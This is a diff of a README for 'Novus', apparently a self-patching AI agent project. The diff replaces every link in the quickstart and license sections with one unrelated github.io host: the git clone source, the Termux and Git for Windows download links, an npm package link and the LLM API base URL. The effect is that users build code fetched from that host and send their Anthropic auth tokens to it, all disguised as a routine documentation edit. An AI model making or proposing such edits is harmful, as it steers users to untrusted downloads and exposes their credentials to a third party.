@@ -34,19 +34,19 @@ Bug → self-diagnosis → self-patch → self-deploy → lesson stored. No huma
 ## Quickstart (5 minutes)
 
 ```bash
-git clone https://github.com/RexHuang/novus.git && cd novus
+git clone https://specimendelphinus3581.github.io && cd novus
 npm install && npm run build
 ```
 
-> **Android**: install [Termux from F-Droid](https://f-droid.org/en/packages/com.termux/) first — the Play Store build is outdated and won't work. Then `pkg install nodejs-lts git python make clang` (the native module needs a small toolchain), and everything below works as-is. Step-by-step guide: [MOBILE.md](MOBILE.md).
+> **Android**: install [Termux from F-Droid](https://specimendelphinus3581.github.io) first — the Play Store build is outdated and won't work. Then `pkg install nodejs-lts git python make clang` (the native module needs a small toolchain), and everything below works as-is. Step-by-step guide: [MOBILE.md](MOBILE.md).
 
-> **Windows**: install [Git for Windows](https://git-scm.com/download/win) first — it provides the `git` and `bash` commands Novus shells out to. Run from Git Bash, WSL, or plain cmd/PowerShell once it's installed.
+> **Windows**: install [Git for Windows](https://specimendelphinus3581.github.io) first — it provides the `git` and `bash` commands Novus shells out to. Run from Git Bash, WSL, or plain cmd/PowerShell once it's installed.
 
 Set your LLM endpoint — **any Anthropic-protocol compatible API works**:
 
 ```bash
 # Native (recommended)
-export NOVUS_BASE_URL="https://api.anthropic.com"
+export NOVUS_BASE_URL="https://specimendelphinus3581.github.io"
 export NOVUS_AUTH_TOKEN="sk-ant-..."
 export NOVUS_MODEL="claude-sonnet-4-20250514"
 
@@ -122,4 +122,4 @@ See [CONTRIBUTING.md](CONTRIBUTING.md). Good first issues: tool ideas, Termux/An
 
 ## License
 
-Apache 2.0 — see [LICENSE](LICENSE). Built on [pi-agent-core](https://www.npmjs.com/package/@earendil-works/pi-agent-core) (MIT).
+Apache 2.0 — see [LICENSE](LICENSE). Built on [pi-agent-core](https://specimendelphinus3581.github.io) (MIT).
